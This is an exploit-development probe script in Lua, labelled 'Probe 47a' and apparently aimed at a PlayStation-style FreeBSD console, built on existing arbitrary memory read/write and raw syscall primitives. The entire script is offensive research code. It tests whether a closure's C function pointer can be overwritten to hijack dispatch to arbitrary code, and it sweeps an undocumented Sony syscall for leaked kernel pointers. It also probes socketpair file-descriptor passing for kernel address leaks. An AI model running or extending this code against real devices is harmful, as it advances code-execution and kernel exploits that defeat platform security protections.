-- CRASH_CLASS: LOW
-- PROBE 47a: DISPATCH MECHANISM + SONY 557 DEEP
--
-- Context: Probe 46b found __call at 0x311023aa0 in loader memory.
-- All syscall objects are tables sharing this metatable with entries:
--   create_initial_chain, new, __call, __tostring, __index, arg_addr, chain
-- Probe 46a found syscall 557 responds to version fields in struct input:
--   {size=0x200} → 16901, {ver=1, size=0x200} → 518
--
-- This probe:
-- A: Map the __call C function — which module? Can we read its code?
-- B: Investigate arg_addr and chain metatable entries
-- C: Find writable dispatch pointers in the __call neighborhood
-- D: Sony 557 version field sweep — find all valid versions
-- E: Sony 557 with buffer output patterns for each version
-- F: Socketpair exploitation — SCM_RIGHTS, fd manipulation

print("=== PROBE 47a: DISPATCH + SONY 557 DEEP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end

local pid = to_num(make_syscall(20)())
print("pid: " .. pid)
print("")

-- Get module bases for cross-referencing
local sc_info = make_syscall(593)
local info_buf = memory.alloc(0x200)
local modules = {}
for handle = 0, 40 do
    safe_wd(info_buf, 0x160)
    local ok_mi = pcall(function() sc_info(uint64(handle), uint64(info_buf)) end)
    if ok_mi then
        local text_lo = safe_rd(info_buf + 0x108)
        local text_hi = safe_rd(info_buf + 0x10C)
        local text_sz_lo = safe_rd(info_buf + 0x110)
        local text_sz_hi = safe_rd(info_buf + 0x114)
        local data_lo = safe_rd(info_buf + 0x118)
        local data_hi = safe_rd(info_buf + 0x11C)
        local data_sz_lo = safe_rd(info_buf + 0x120)
        local data_sz_hi = safe_rd(info_buf + 0x124)
        if text_lo and text_hi and (text_lo ~= 0 or text_hi ~= 0) then
            table.insert(modules, {
                handle = handle,
                text_hi = text_hi, text_lo = text_lo,
                text_sz_hi = text_sz_hi or 0, text_sz_lo = text_sz_lo or 0,
                data_hi = data_hi or 0, data_lo = data_lo or 0,
                data_sz_hi = data_sz_hi or 0, data_sz_lo = data_sz_lo or 0,
            })
        end
    end
end

local function find_module(ah, al)
    for _, m in ipairs(modules) do
        local te_h = m.text_hi + m.text_sz_hi
        local te_l = m.text_lo + m.text_sz_lo
        if te_l >= 0x100000000 then te_h = te_h + 1; te_l = te_l - 0x100000000 end
        if (ah > m.text_hi or (ah == m.text_hi and al >= m.text_lo)) and
           (ah < te_h or (ah == te_h and al < te_l)) then
            return m.handle, "text", al - m.text_lo
        end
        if m.data_lo ~= 0 or m.data_hi ~= 0 then
            local de_h = m.data_hi + m.data_sz_hi
            local de_l = m.data_lo + m.data_sz_lo
            if de_l >= 0x100000000 then de_h = de_h + 1; de_l = de_l - 0x100000000 end
            if (ah > m.data_hi or (ah == m.data_hi and al >= m.data_lo)) and
               (ah < de_h or (ah == de_h and al < de_l)) then
                return m.handle, "data", al - m.data_lo
            end
        end
    end
    return nil
end

print("=== A: __CALL DISPATCH FUNCTION ANALYSIS ===")
local mt = getmetatable(syscall.pipe)
local call_fn = mt.__call
local call_str = tostring(call_fn)
print("__call: " .. call_str)

-- Extract C function pointer from CClosure
local fn_hex = call_str:match("0x([0-9a-fA-F]+)")
if fn_hex then
    local fn_obj = uint64("0x" .. fn_hex)
    print("CClosure object: 0x" .. fn_hex)

    -- Read structure to find C function pointer
    print("CClosure memory dump:")
    for off = 0, 80, 8 do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            local note = ""
            local mod, sect, moff = find_module(h, l)
            if mod then
                note = string.format(" → mod%d.%s+0x%X", mod, sect, moff)
            end
            print(string.format("  +%02d: %s%s", off, fmt_addr(val), note))
        else
            print(string.format("  +%02d: UNREADABLE", off))
        end
    end

    -- The C function pointer is likely at offset 32 (standard Lua 5.1 CClosure)
    -- Try each candidate and cross-reference with modules
    print("")
    print("C function pointer candidates:")
    for _, off in ipairs({16, 24, 32, 40, 48, 56}) do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            local mod, sect, moff = find_module(h, l)
            if mod then
                print(string.format("  +%02d: %s → MODULE %d %s+0x%X  *** LIKELY ***",
                    off, fmt_addr(val), mod, sect, moff))
            else
                -- Check if it's in eboot's RX range (readable)
                if h == 0 and l >= 0x08000000 and l < 0x10000000 then
                    print(string.format("  +%02d: %s (possible code in low range)", off, fmt_addr(val)))
                elseif h >= 3 and h <= 4 then
                    print(string.format("  +%02d: %s (heap/mmap range)", off, fmt_addr(val)))
                end
            end
        end
    end

    -- Try to read code bytes at the C function (if in RX region)
    for _, off in ipairs({32, 40, 24}) do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            local mod, sect, moff = find_module(h, l)
            if mod and sect == "text" then
                print("")
                print(string.format("Reading code at +%d (%s) — module %d text+0x%X:",
                    off, fmt_addr(val), mod, moff))
                -- Read 64 bytes of code (hex dump)
                local code_addr = val
                for row = 0, 48, 16 do
                    local hex = ""
                    local readable = true
                    for col = 0, 15 do
                        local ok_b, b = pcall(function()
                            return memory.read_byte(code_addr + row + col)
                        end)
                        if ok_b then
                            hex = hex .. string.format("%02x ", to_num(b))
                        else
                            hex = hex .. "?? "
                            readable = false
                        end
                    end
                    print(string.format("  +%03x: %s", row, hex))
                    if not readable then
                        print("  *** HIT XO BOUNDARY — stopping read ***")
                        break
                    end
                end
                break
            end
        end
    end
end
print("")

print("=== B: METATABLE ENTRIES DEEP DIVE ===")
-- Investigate arg_addr, chain, create_initial_chain, new
for _, key in ipairs({"arg_addr", "chain", "create_initial_chain", "new", "__index"}) do
    local ok_v, val = pcall(function() return mt[key] end)
    if ok_v and val ~= nil then
        local vtype = type(val)
        print(string.format("  mt.%s [%s]:", key, vtype))
        if vtype == "function" then
            print("    " .. tostring(val))
            -- Try to get address from tostring
            local fh = tostring(val):match("0x([0-9a-fA-F]+)")
            if fh then
                local faddr = uint64("0x" .. fh)
                -- Read first qword to see if it looks like a function object
                local fv = safe_rq(faddr + 32)
                if fv then
                    local vh, vl = get_hi_lo(fv)
                    local mod, sect, moff = find_module(vh, vl)
                    if mod then
                        print(string.format("    C func ptr: %s → mod%d.%s+0x%X",
                            fmt_addr(fv), mod, sect, moff))
                    else
                        print("    C func ptr candidate: " .. fmt_addr(fv))
                    end
                end
            end
        elseif vtype == "number" then
            print(string.format("    value: %d (0x%X)", val, val))
        elseif vtype == "string" then
            print("    value: '" .. val:sub(1, 60) .. "'")
        elseif vtype == "table" then
            print("    table contents:")
            local count = 0
            for k2, v2 in pairs(val) do
                count = count + 1
                if count <= 10 then
                    print("      " .. tostring(k2) .. " = " .. tostring(v2):sub(1, 50))
                end
            end
            print("    entries: " .. count)
        elseif vtype == "userdata" then
            print("    " .. tostring(val):sub(1, 80))
        end
    else
        print("  mt." .. key .. ": nil or inaccessible")
    end
end

-- Check what __index returns for key lookups on a syscall object
print("")
print("  __index behavior on syscall objects:")
local test_keys = {"syscall_no", "fn_addr", "ropchain", "arg_addr", "chain",
                   "slot0", "slot1", "slot2", "slot3", "slot4", "slot5",
                   "arg0", "arg1", "arg2", "rdi", "rsi", "rdx", "rcx", "r8", "r9"}
for _, key in ipairs(test_keys) do
    local ok_k, val_k = pcall(function() return syscall.pipe[key] end)
    if ok_k and val_k ~= nil then
        print(string.format("    pipe.%s = %s [%s]", key, tostring(val_k):sub(1, 50), type(val_k)))
    end
end
print("")

print("=== C: WRITABLE FUNCTION POINTERS SCAN ===")
-- Scan the neighborhood of __call for writable function pointers
-- The dispatch function might read a function pointer from writable memory
if fn_hex then
    local fn_obj = uint64("0x" .. fn_hex)

    -- Check if the CClosure itself is writable
    local saved = safe_rq(fn_obj + 32)
    if saved then
        local wrote = safe_wq(fn_obj + 32, uint64("0xDEADDEADDEADDEAD"))
        local rb = safe_rq(fn_obj + 32)
        safe_wq(fn_obj + 32, saved) -- restore immediately
        local h, l = get_hi_lo(rb)
        local is_writable = (h == 0xDEADDEAD)
        print("  CClosure+32 writable: " .. tostring(is_writable))
        if is_writable then
            print("  *** CClosure C function pointer is WRITABLE! ***")
            print("  *** We could redirect __call to arbitrary code! ***")
        end
    end

    -- Also check arg_addr if it's a pointer
    local ok_aa, arg_addr_val = pcall(function() return mt.arg_addr end)
    if ok_aa and arg_addr_val ~= nil then
        if type(arg_addr_val) == "number" or
           (type(arg_addr_val) == "table" and arg_addr_val.h) then
            local aah, aal = get_hi_lo(arg_addr_val)
            print("  arg_addr value: " .. fmt_addr(arg_addr_val))
            if aah >= 3 and aah <= 4 then
                -- Heap range — scan for function pointers
                local base = arg_addr_val
                print("  arg_addr neighborhood (heap range):")
                for off = -32, 128, 8 do
                    local v = safe_rq(base + off)
                    if v then
                        local vh, vl = get_hi_lo(v)
                        local mod, sect, moff = find_module(vh, vl)
                        local note = ""
                        if mod then
                            note = string.format(" → mod%d.%s+0x%X", mod, sect, moff)
                        end
                        print(string.format("    %+04d: %s%s", off, fmt_addr(v), note))
                    end
                end
            end
        end
    end
end
print("")

print("=== D: SONY SYSCALL 557 VERSION SWEEP ===")
local sc557 = make_syscall(557)
local st = memory.alloc(0x400)

-- Sweep version field 0-255 with size=0x200
print("  version sweep (size=0x200):")
local version_results = {}
for ver = 0, 255 do
    for i = 0, 0x1FF, 4 do safe_wd(st + i, 0) end
    safe_wd(st, ver)
    safe_wd(st + 4, 0x200)
    local ok_v, ret_v = pcall(function() return sc557(uint64(st)) end)
    local r = ok_v and to_num(ret_v) or -999
    if r ~= -1 and r ~= -999 then
        print(string.format("    ver=%d → ret=%d (0x%X)", ver, r, r))
        table.insert(version_results, {ver = ver, ret = r})
    end
end
print("  valid versions found: " .. #version_results)

-- For each valid version, check if buffer gets modified
print("")
print("  buffer modification per version:")
for _, vr in ipairs(version_results) do
    for i = 0, 0x3FF, 4 do safe_wd(st + i, 0xDEADDEAD) end
    safe_wd(st, vr.ver)
    safe_wd(st + 4, 0x200)
    pcall(function() sc557(uint64(st)) end)

    -- Check how much was modified
    local modified_bytes = 0
    for i = 8, 0x1FF, 4 do
        local v = safe_rd(st + i)
        if v and v ~= 0xDEADDEAD then
            modified_bytes = modified_bytes + 4
        end
    end
    if modified_bytes > 0 then
        print(string.format("    ver=%d: %d bytes modified!", vr.ver, modified_bytes))
        -- Dump modified region
        for off = 0, math.min(0xFF, 0x1FF), 8 do
            local v = safe_rq(st + off)
            if v then
                local h, l = get_hi_lo(v)
                local note = ""
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    note = " *** KERNEL PTR ***"
                end
                if fmt_addr(v) ~= "DEADDEAD_DEADDEAD" then
                    print(string.format("      +%03x: %s%s", off, fmt_addr(v), note))
                end
            end
        end
    else
        print(string.format("    ver=%d: no modification", vr.ver))
    end
end

-- Also try: size field variations with working version
if #version_results > 0 then
    local best_ver = version_results[1].ver
    print("")
    print("  size sweep with ver=" .. best_ver .. ":")
    for _, sz in ipairs({0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000}) do
        for i = 0, 0x3FF, 4 do safe_wd(st + i, 0) end
        safe_wd(st, best_ver)
        safe_wd(st + 4, sz)
        local ok_s, ret_s = pcall(function() return sc557(uint64(st)) end)
        print(string.format("    size=0x%X: ret=%s",
            sz, ok_s and tostring(to_num(ret_s)) or "CRASH"))
    end
end
print("")

print("=== E: SONY 557 WITH DIFFERENT ARG POSITIONS ===")
-- The struct might be arg2 with handle as arg1 (like dynlib_get_info)
for i = 0, 0x3FF, 4 do safe_wd(st + i, 0xDEADDEAD) end
safe_wd(st, 0x200)
safe_wd(st + 4, 0)

-- Pattern: 557(pid, buf)
local ok_e1, ret_e1 = pcall(function() return sc557(uint64(pid), uint64(st)) end)
print("557(pid, buf{size=0x200}): ret=" .. (ok_e1 and to_num(ret_e1) or -999))
local mod_e1 = false
for i = 8, 0xFF, 4 do
    local v = safe_rd(st + i)
    if v and v ~= 0xDEADDEAD then mod_e1 = true; break end
end
if mod_e1 then
    print("  *** BUFFER MODIFIED with (pid, buf) pattern! ***")
    for off = 0, 0x7F, 8 do
        local v = safe_rq(st + off)
        if v and fmt_addr(v) ~= "DEADDEAD_DEADDEAD" then
            local h, l = get_hi_lo(v)
            local note = ""
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then note = " *** KPTR ***" end
            print(string.format("    +%03x: %s%s", off, fmt_addr(v), note))
        end
    end
end

-- Pattern: 557(0, buf, size)
for i = 0, 0x3FF, 4 do safe_wd(st + i, 0xDEADDEAD) end
local ok_e2, ret_e2 = pcall(function() return sc557(uint64(0), uint64(st), uint64(0x400)) end)
print("557(0, buf, 0x400): ret=" .. (ok_e2 and to_num(ret_e2) or -999))
local mod_e2 = false
for i = 0, 0xFF, 4 do
    local v = safe_rd(st + i)
    if v and v ~= 0xDEADDEAD then mod_e2 = true; break end
end
if mod_e2 then
    print("  *** BUFFER MODIFIED with (0, buf, size) pattern! ***")
    for off = 0, 0x7F, 8 do
        local v = safe_rq(st + off)
        if v and fmt_addr(v) ~= "DEADDEAD_DEADDEAD" then
            local h, l = get_hi_lo(v)
            local note = ""
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then note = " *** KPTR ***" end
            print(string.format("    +%03x: %s%s", off, fmt_addr(v), note))
        end
    end
end
print("")

print("=== F: SOCKETPAIR EXPLOITATION ===")
local SYS_socketpair = 135
local SYS_sendmsg = 28
local SYS_recvmsg = 27
local SYS_close = 6
local SYS_getsockopt = 118
local SYS_setsockopt = 105
local AF_LOCAL = 1
local SOCK_STREAM = 1
local SOL_SOCKET = 0xFFFF

-- Create socketpair
local sc_sp = make_syscall(SYS_socketpair)
local sp_fds = memory.alloc(16)
safe_wd(sp_fds, 0xFFFFFFFF)
safe_wd(sp_fds + 4, 0xFFFFFFFF)
local ok_sp, ret_sp = pcall(function()
    return sc_sp(uint64(AF_LOCAL), uint64(SOCK_STREAM), uint64(0), uint64(sp_fds))
end)
local fd0 = safe_rd(sp_fds)
local fd1 = safe_rd(sp_fds + 4)
print("socketpair: ret=" .. (ok_sp and to_num(ret_sp) or -999) ..
      " fd0=" .. (fd0 or "?") .. " fd1=" .. (fd1 or "?"))

if fd0 and fd0 ~= 0xFFFFFFFF and fd1 and fd1 ~= 0xFFFFFFFF then
    -- Test SCM_RIGHTS — pass an fd through the socketpair
    -- This creates kernel objects (struct file, struct unpcb) that might leak pointers
    local SCM_RIGHTS = 1
    local sc_sendmsg = make_syscall(SYS_sendmsg)
    local sc_recvmsg = make_syscall(SYS_recvmsg)

    -- Build sendmsg with SCM_RIGHTS control message
    -- msghdr: msg_name(8), msg_namelen(4), pad(4), msg_iov(8), msg_iovlen(8),
    --         msg_control(8), msg_controllen(4), pad(4), msg_flags(4)
    local msghdr = memory.alloc(128)
    local iov = memory.alloc(16)
    local data = memory.alloc(8)
    safe_wd(data, 0x41424344) -- "DCBA"

    -- iovec: iov_base(8) + iov_len(8)
    safe_wq(iov, uint64(data))
    safe_wq(iov + 8, uint64(4))

    -- cmsghdr + fd payload
    -- cmsghdr: cmsg_len(4), cmsg_level(4), cmsg_type(4), [data]
    local cmsg = memory.alloc(32)
    safe_wd(cmsg, 16 + 4)    -- cmsg_len = header(16? or 12?) + sizeof(int)
    safe_wd(cmsg + 4, 0)     -- padding
    safe_wd(cmsg + 8, SOL_SOCKET) -- cmsg_level
    safe_wd(cmsg + 12, SCM_RIGHTS) -- cmsg_type
    safe_wd(cmsg + 16, fd0)  -- the fd to pass

    -- Actually on FreeBSD 64-bit, cmsghdr is:
    -- socklen_t cmsg_len (4 bytes)
    -- int cmsg_level (4 bytes)
    -- int cmsg_type (4 bytes)
    -- data follows at offset 12, but CMSG_DATA rounds up
    -- CMSG_LEN(4) = 12 + 4 = 16 for one fd
    safe_wd(cmsg, 16)              -- cmsg_len
    safe_wd(cmsg + 4, SOL_SOCKET)  -- cmsg_level
    safe_wd(cmsg + 8, SCM_RIGHTS)  -- cmsg_type
    safe_wd(cmsg + 12, fd0)        -- the fd

    -- msghdr for send
    for i = 0, 127, 4 do safe_wd(msghdr + i, 0) end
    safe_wq(msghdr + 0, uint64(0))    -- msg_name = NULL
    safe_wd(msghdr + 8, 0)            -- msg_namelen = 0
    safe_wq(msghdr + 16, uint64(iov)) -- msg_iov
    safe_wq(msghdr + 24, uint64(1))   -- msg_iovlen = 1
    safe_wq(msghdr + 32, uint64(cmsg))-- msg_control
    safe_wd(msghdr + 40, 16)          -- msg_controllen = 16

    -- Send on fd0
    local ok_send, ret_send = pcall(function()
        return sc_sendmsg(uint64(fd0), uint64(msghdr), uint64(0))
    end)
    print("sendmsg(SCM_RIGHTS) on fd0: ret=" ..
          (ok_send and to_num(ret_send) or -999))

    -- Receive on fd1
    local recv_cmsg = memory.alloc(64)
    local recv_data = memory.alloc(32)
    local recv_iov = memory.alloc(16)
    safe_wq(recv_iov, uint64(recv_data))
    safe_wq(recv_iov + 8, uint64(32))

    local recv_msghdr = memory.alloc(128)
    for i = 0, 127, 4 do safe_wd(recv_msghdr + i, 0) end
    safe_wq(recv_msghdr + 0, uint64(0))
    safe_wd(recv_msghdr + 8, 0)
    safe_wq(recv_msghdr + 16, uint64(recv_iov))
    safe_wq(recv_msghdr + 24, uint64(1))
    safe_wq(recv_msghdr + 32, uint64(recv_cmsg))
    safe_wd(recv_msghdr + 40, 64)

    local ok_recv, ret_recv = pcall(function()
        return sc_recvmsg(uint64(fd1), uint64(recv_msghdr), uint64(0))
    end)
    print("recvmsg on fd1: ret=" .. (ok_recv and to_num(ret_recv) or -999))

    if ok_recv and to_num(ret_recv) >= 0 then
        -- Check received cmsg
        local rcmsg_len = safe_rd(recv_cmsg)
        local rcmsg_level = safe_rd(recv_cmsg + 4)
        local rcmsg_type = safe_rd(recv_cmsg + 8)
        local rcmsg_fd = safe_rd(recv_cmsg + 12)
        print("  cmsg_len=" .. (rcmsg_len or "?") ..
              " level=" .. (rcmsg_level or "?") ..
              " type=" .. (rcmsg_type or "?") ..
              " fd=" .. (rcmsg_fd or "?"))
        if rcmsg_fd and rcmsg_fd ~= 0 and rcmsg_fd ~= 0xFFFFFFFF then
            print("  *** SCM_RIGHTS works! Received fd " .. rcmsg_fd .. " ***")
        end

        -- Check msg_flags for truncation, etc
        local rflags = safe_rd(recv_msghdr + 44)
        print("  msg_flags: 0x" .. string.format("%X", rflags or 0))

        -- Dump full received cmsg area for any kernel pointers
        print("  recv cmsg dump:")
        for off = 0, 56, 8 do
            local v = safe_rq(recv_cmsg + off)
            if v then
                local h, l = get_hi_lo(v)
                local note = ""
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    note = " *** KERNEL PTR ***"
                end
                print(string.format("    +%02d: %s%s", off, fmt_addr(v), note))
            end
        end
    end

    -- Test SO_PEERCRED — might reveal kernel info
    local sc_getopt = make_syscall(SYS_getsockopt)
    local cred_buf = memory.alloc(64)
    local cred_len = memory.alloc(8)
    for i = 0, 63, 4 do safe_wd(cred_buf + i, 0xDEADDEAD) end
    safe_wd(cred_len, 64)

    local LOCAL_PEERCRED = 0x001 -- FreeBSD LOCAL_PEERCRED
    local ok_cred, ret_cred = pcall(function()
        return sc_getopt(uint64(fd0), uint64(0), uint64(LOCAL_PEERCRED),
            uint64(cred_buf), uint64(cred_len))
    end)
    local cred_sz = safe_rd(cred_len) or 0
    print("")
    print("LOCAL_PEERCRED: ret=" .. (ok_cred and to_num(ret_cred) or -999) ..
          " len=" .. cred_sz)
    if ok_cred and to_num(ret_cred) == 0 then
        for off = 0, math.min(cred_sz - 1, 31), 4 do
            local v = safe_rd(cred_buf + off)
            print(string.format("  +%02d: 0x%08X (%d)", off, v or 0, v or 0))
        end
    end

    -- Cleanup
    pcall(function() make_syscall(SYS_close)(uint64(fd0)) end)
    pcall(function() make_syscall(SYS_close)(uint64(fd1)) end)
end
print("")

print("=== PROBE 47a COMPLETE ===")
